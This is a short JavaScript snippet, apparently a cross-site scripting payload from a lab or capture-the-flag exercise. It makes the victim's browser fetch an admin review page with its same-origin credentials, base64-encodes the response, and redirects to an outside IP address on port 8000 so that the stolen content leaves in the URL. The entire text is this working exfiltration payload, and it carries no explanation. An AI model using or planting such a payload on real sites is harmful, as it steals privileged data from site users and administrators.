fetch("/admin/review.php?id=1",{credentials:"same-origin"}).then(r=>r.text()).then(t=>{
  location = "http://10.133.3.211:8000/b?d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(t))));
});
